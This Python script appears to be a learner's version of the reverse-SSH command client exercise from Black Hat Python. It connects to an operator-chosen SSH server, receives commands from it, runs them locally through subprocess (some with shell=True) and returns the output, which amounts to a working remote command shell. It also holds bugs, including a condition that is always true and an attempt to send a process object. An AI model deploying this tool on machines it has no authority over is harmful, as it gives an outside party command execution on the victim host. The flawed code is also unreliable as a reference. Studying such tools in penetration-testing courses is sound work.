# FOUND ON PAGE 27 of BHP

import getpass
import os
import paramiko
import shlex        # https://docs.python.org/3/library/shlex.html
import subprocess

def ssh_command(ip, port, user, passwd, command):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = ssh_client.get_transport().open_session() # This is new from our last script
    if ssh_session.active: 
        #* https://docs.paramiko.org/en/stable/api/channel.html?highlight=open_session.active#paramiko.channel.Channel.active
        #* https://docs.paramiko.org/en/stable/api/client.html?highlight=get_transport#paramiko.client.SSHClient.get_transport
        ssh_session.send(command)
        print(ssh_session.recv(1024))

        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    ssh_client.close()
                    break

                print(shlex.split(cmd))
                is_cd = cmd.split(' ')
                cmd_to_exec = is_cd[0]

                if cmd_to_exec == 'cd':
                    cd_path = is_cd[1] or '/home/'
                    os.chdir(cd_path)
                    
                if cmd_to_exec == 'cat' or 'type':
                    # https://docs.python.org/3.10/library/subprocess.html?highlight=subprocess%20run#subprocess.run (below)
                    # had to use different subprocess.run settings for the cat command
                    cmd_result = subprocess.run(shlex.split(cmd), capture_output=True, text=True)

                    if cmd_result.returncode == 0:
                        ssh_session.send(str(cmd_result.stdout))
                    else:
                        ssh_session.send(str(cmd_result.stderr))


                # process_data = subprocess.Popen(shlex.split(cmd), shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, universal_newlines=True)
                # *** TESTING CONVERING EVERYTHING TO subprocess.run() *** 
                process_data = subprocess.run(shlex.split(cmd), shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, universal_newlines=True)

                ssh_session.send(process_data or 'okay')

                #! Improve this for the cat command and changing dirs
                #! take logic from the repcat code
                # cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                # ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        ssh_client.close()
    return

if __name__ == '__main__':
    # user = getpass.getuser()
    user = input('Enter username: ')
    password = getpass.getpass()

    ip = input('Enter server IP: ')
    port = input('Enter server port: ')
    
ssh_command(ip, port=port, user=user, passwd=password, command='ClientConnected')